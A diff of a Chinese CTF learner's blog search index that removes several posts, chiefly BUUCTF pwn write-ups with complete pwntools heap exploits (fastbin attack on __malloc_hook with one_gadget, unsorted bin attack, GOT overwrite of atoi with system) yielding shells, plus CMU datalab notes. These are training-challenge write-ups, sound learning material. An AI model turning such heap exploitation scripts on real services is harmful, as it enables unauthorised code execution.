@@ -21,17 +21,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HITCTF 2020复现</title>
-    <url>/2020/12/24/HITCTF-2020%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>hitctf 2020</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bomblab</title>
     <url>/2020/07/24/bomblab/</url>
     <content><![CDATA[<p>总共六个阶段</p>
@@ -161,6 +150,17 @@
       </tags>
   </entry>
   <entry>
+    <title>HITCTF 2020复现</title>
+    <url>/2020/12/24/HITCTF-2020%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>hitctf 2020</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>beginner</title>
     <url>/2020/09/07/beginner/</url>
     <content><![CDATA[<h4 id="file文件"><a href="#file文件" class="headerlink" title="file文件"></a>file文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@winter-ubuntu16:~&#x2F;googlectf&#x2F;reverse-beginner$ file a.out </span><br><span class="line">a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;e3a5d8dc3eee0e960c602b9b2207150c91dc9dff, for GNU&#x2F;Linux 3.2.0, not strippd</span><br></pre></td></tr></table></figure>
@@ -232,241 +232,6 @@
       </categories>
       <tags>
         <tag>googlectf 2020</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctf常用快捷键</title>
-    <url>/2021/03/05/ctf%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
-    <content><![CDATA[<blockquote>
-<p>碰到好用的在这里记录下来</p>
-</blockquote>
-<ol>
-<li>ida重命名：n</li>
-</ol>
-]]></content>
-      <categories>
-        <category>快捷键</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buu刷题笔记</title>
-    <url>/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="vn-pwn-simpleHeap"><a href="#vn-pwn-simpleHeap" class="headerlink" title="vn_pwn_simpleHeap"></a>vn_pwn_simpleHeap</h2><p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120094648513.png" alt="image-20201120094648513"></p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120094808176.png" alt="image-20201120094808176"></p>
-<p>e = 7 + 7</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x18,&#39;pppp&#39;)</span><br><span class="line">add(0x60,&#39;pppp&#39;)</span><br><span class="line">add(0x60,&#39;pppp&#39;)</span><br><span class="line">add(0x10,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120094858507.png" alt="image-20201120094858507"></p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120094932009.png" alt="image-20201120094932009"></p>
-<p>程序以为只有三个了，因为0xe1把0x71覆盖了，但是0x71还是可以用的。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;p&#39;*0x18+&#39;\xe1&#39;</span><br><span class="line">edit(0,payload)</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095055903.png" alt="image-20201120095055903"></p>
-<p>放入了unsortedbin中</p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095130576.png" alt="image-20201120095130576"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095223789.png" alt="image-20201120095223789"></p>
-<p>会把原来unsortedbin中上面的块分走，那么下面里面存放的fd和bk就可以通过原来第二个0x71来输出了。</p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095331695.png" alt="image-20201120095331695"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>得到了unsortedbin的链表头，可以得到main_arena的地址和libc的地址。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main_arena&#x3D;u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_one_gadget&#x3D;[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">one_gadget&#x3D;libc_base+libc_one_gadget[1]</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;__libc_realloc&#39;]</span><br><span class="line">fake_chunk&#x3D;malloc_hook-0x23</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120095807801.png" alt="image-20201120095807801"></p>
-<p>变回来了，但是第二个0x71有两个块同时指向chunk2和chunk4</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)#5</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>double free?</p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120100035193.png" alt="image-20201120100035193"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(4)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>这时候，chunk2和chunk4指向同一个，chunk4被释放了，但是chunk2还在，可以fastbin attack？</p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120100330055.png" alt="image-20201120100330055"></p>
-<p>修改了fd指针</p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120100417281.png" alt="image-20201120100417281"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;p64(fake_chunk)</span><br><span class="line">edit(2,payload)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120100443552.png" alt="image-20201120100443552"></p>
-<p>申请回来</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>然后再申请会到下面这个地址里面，然后因为one_gadget的限制，所以需要利用realloc_hook。</p>
-<p>方法：</p>
-<ol>
-<li><p>realloc填上one_gadget</p>
-</li>
-<li><p>再在malloc上填上对应的realloc调整地址（根据需要减少pop），malloc上面8个就是realloc</p>
-<p>第二部里面的realloc地址是在libc里面的函数地址，，，</p>
-</li>
-</ol>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120161711894.png" alt="image-20201120161711894"></p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120155747244.png" alt="image-20201120155747244"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;p&#39;*0xb+p64(one_gadget)+p64(realloc+13)</span><br><span class="line">add(0x60,payload)</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246786.htm</a></p>
-<hr>
-<p>最后在申请一下，就的到shell了。</p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120155844851.png" alt="image-20201120155844851"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&#39;choice: &#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;size?&#39;)</span><br><span class="line">p.sendline(&quot;12&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>完整exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',26521)</span></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size?'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">payload=<span class="string">'p'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">libc_base=main_arena<span class="number">-0x3c4b20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_one_gadget=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base+libc_one_gadget[<span class="number">1</span>]</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">fake_chunk=malloc_hook<span class="number">-0x23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"[*]libc_base"</span>+hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'p'</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size?'</span>)</span><br><span class="line">p.sendline(<span class="string">"12"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>不知道为什么本地打不通，但是远程莫得问题</p>
-<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><h3 id="前期保护"><a href="#前期保护" class="headerlink" title="前期保护"></a>前期保护</h3><p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120173551508.png" alt="image-20201120173551508"></p>
-<p>64位的，没有开pie和relro，顿时觉得easy</p>
-<p>没开pie，可以用elf里的plt和got表，没开relro，可以覆盖got表地址。</p>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120173920525.png" alt="image-20201120173920525"></p>
-<p>edit里面可以输入长度，造成堆溢出</p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120174112398.png" alt="image-20201120174112398"></p>
-<p>程序留有后面函数，，</p>
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120174142786.png" alt="image-20201120174142786"></p>
-<p>只要v3 == 4869，也就是选择输入的时候输入4869即可。并且让magic大于0x1305可以，unsortedbin可以实现向任意地址读入</p>
-<h3 id="方法一-unsortbin-attack"><a href="#方法一-unsortbin-attack" class="headerlink" title="方法一 unsortbin attack"></a>方法一 unsortbin attack</h3><p>首先申请了三个堆块，其中第二个要大于0x70为unsortbin</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x20,&#39;aaaa&#39;)</span><br><span class="line">add(0x80,&#39;aaaa&#39;)</span><br><span class="line">add(0x20,&#39;aaaa&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>然后将第二个释放，放入unsortbin中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
-
-<p>利用堆溢出，将unsortbin内容修改，其中fd为任意，bk为目标地址 - 0x10</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fd &#x3D; 0</span><br><span class="line">bk &#x3D; magic - 0x10</span><br><span class="line">edit(0,0x20+0x20,&quot;a&quot;*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk))</span><br></pre></td></tr></table></figure>
-
-<p>接着，把我们的unsortbin申请回来，实现unsortbin attack</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x80,&#39;aaaa&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>然后，v3输入4869，此时magic已经是一个很大的数，就可以进入后面函数了。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(&quot;4869&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./easyheap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28942"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x06020C0</span></span><br><span class="line"></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>+<span class="number">0x20</span>,<span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"4869"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2020/11/20/buu%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201120175326957.png" alt="image-20201120175326957"></p>
-<p>远程有点问题，，，所以要非预期解了。。。</p>
-<h3 id="方法二-fastbin修改got表"><a href="#方法二-fastbin修改got表" class="headerlink" title="方法二 fastbin修改got表"></a>方法二 fastbin修改got表</h3><p>因为后面要申请到的是0x7f，所以刚开始创建0x68的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x68,&#39;aaaa&#39;)#0</span><br><span class="line">add(0x68,&#39;aaaa&#39;)#1</span><br><span class="line">add(0x68,&#39;aaaa&#39;)#2</span><br></pre></td></tr></table></figure>
-
-<p>然后释放掉一个块，用上一块块溢出到下一个块，将fd里面填入heaparray[i]附近的内容，再申请回来</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x60+p64(0)+p64(0x71)+p64(0x6020ad)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(0x68,&#39;aaaa&#39;)#1</span><br></pre></td></tr></table></figure>
-
-<p>往申请回来的块里面填入atoi的got表</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;b&#39;*35 + p64(elf.got[&#39;atoi&#39;])</span><br><span class="line">add(0x68,payload)</span><br></pre></td></tr></table></figure>
-
-<p>然后往got表里面填入system的plt表</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; p64(elf.plt[&#39;system&#39;])</span><br><span class="line">edit(0,0x8,payload)</span><br></pre></td></tr></table></figure>
-
-<p>然后发送的时候，发送’/bin/sh’，即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./easyheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easyheap"</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28942"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'b'</span>*<span class="number">35</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>buu刷题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>datalab</title>
-    <url>/2020/07/23/datalab/</url>
-    <content><![CDATA[<h4 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1.bitXor"></a>1.bitXor</h4><p>用～（取补）和&amp;实现异或操作</p>
-<p><img src="/2020/07/23/datalab/image-20200720182358141.png" alt="image-20200720182358141"></p>
-<h4 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2.tmin"></a>2.tmin</h4><p>两字节补码的最小数</p>
-<p>0111 1111 1111 1111 1111 1111 1111 1111 最大的，～x + 1，取负，负数比正数小一个</p>
-<p>1000 0000 0000 0000 0000 0000 0000 0000 == 0x80000000 </p>
-<p>太大了，用移位</p>
-<h4 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3.isTmax"></a>3.isTmax</h4><p>如果x是最大值，返回1，否则返回0</p>
-<ul>
-<li>最大值，符号位是0，其他是1，所以+1后，符号位是1，其他是0，相异或，全1,全1的反是0，0取非是1（判断是否是-1的方法）</li>
-<li>除了最大值，-1也有同样的情况</li>
-</ul>
-<p>排除：+1后，最大值是变成另一个数，而-1是0，根据这个排除掉-1</p>
-<h4 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4.allOddBits"></a>4.allOddBits</h4><p>如果奇数位都是1，返回1，否则，返回0</p>
-<p>让x与0xAAAAAAAA相与，如果奇数位都是1，结果是0xAAAAAAAA，再异或就是0了，否则就非0</p>
-<h4 id="5-negate"><a href="#5-negate" class="headerlink" title="5.negate"></a>5.negate</h4><p>实现取反</p>
-<p>-x = ~x + 1</p>
-<h4 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6.isAsciiDigit"></a>6.isAsciiDigit</h4><p>如果 0x30 &lt;= x &lt;= 0x39 ，返回1，否则，返回0</p>
-<p>将x与两数相减（x - y ==  x + （～y + 1） ），判断符号位（通过右移），第一个为正，第二个为负</p>
-<h4 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7.conditional"></a>7.conditional</h4><p>有三个参数，x、y、z，如果x非0，返回y，否则，返回z</p>
-<p>判断x是否非零：!!x</p>
-<p>返回一个数：变成1，然后～x + 1变成-1（全1），然后相与</p>
-<h4 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8.isLessOrEqual"></a>8.isLessOrEqual</h4><p>三种情况</p>
-<ul>
-<li>符号相反，如果y为正数，为1</li>
-<li>符号相同，相减 &gt; 0为1</li>
-<li>两数相等（异或实现），返回1</li>
-</ul>
-<h4 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9.logicalNeg"></a>9.logicalNeg</h4><p>实现取非运算，零返回1，其他返回0</p>
-<p>正负零的符号位都是0</p>
-<p>取反与1&amp;，正负再&amp;</p>
-<h4 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10.howManyBits"></a>10.howManyBits</h4><p>求共有多少位，最高位+1</p>
-<p>特殊情况</p>
-<ul>
-<li>0 : 1</li>
-<li>1 : 1</li>
-</ul>
-<p>正数：最高位1的位置 + 1（符号位）</p>
-<p>负数：求反码，同正数</p>
-<p>具体采用二分，32分成16，看高位16是否为0，非0，说明至少有16 + 1（前面的数）+ 1 （符号位），接着再8、4、2、1下去</p>
-<h4 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11.floatScale2"></a>11.floatScale2</h4><p>实现乘2功能。（内部使用的单精度浮点型）</p>
-<p>特殊情况</p>
-<ul>
-<li>NaN：直接将参数返回回去</li>
-<li>区别规格化数和非规格化数</li>
-</ul>
-<p>单精度浮点内部</p>
-<p><img src="/2020/07/23/datalab/image-20200720214424119.png" alt="image-20200720214424119"></p>
-<p>NaN</p>
-<p><img src="/2020/07/23/datalab/image-20200720214532080.png" alt="image-20200720214532080"></p>
-<p>正负无穷</p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C11.png" alt="11"></p>
-<h4 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12.floatFloat2Int"></a>12.floatFloat2Int</h4><p>参数的类型是unsigned，是浮点数的机器数，将其转换为该浮点数转换的int值。</p>
-<p>情况：</p>
-<ul>
-<li><p>指数部分为为负，说明一定是零点几，直接返0</p>
-</li>
-<li><p>如果大于31，大了，直接返回0x80000000u</p>
-</li>
-<li><p>在里面，先让尾数部分加上默认的1，然后看指数是否能把所有的尾数变整</p>
-<ul>
-<li>E &lt; 23，说明后面还有小数部分</li>
-<li>E &gt; 23，说明尾数都完整整数，还可以继续乘2^(E-23)</li>
-</ul>
-<p>最后，根据符号位，返回对应符号的frac</p>
-</li>
-</ul>
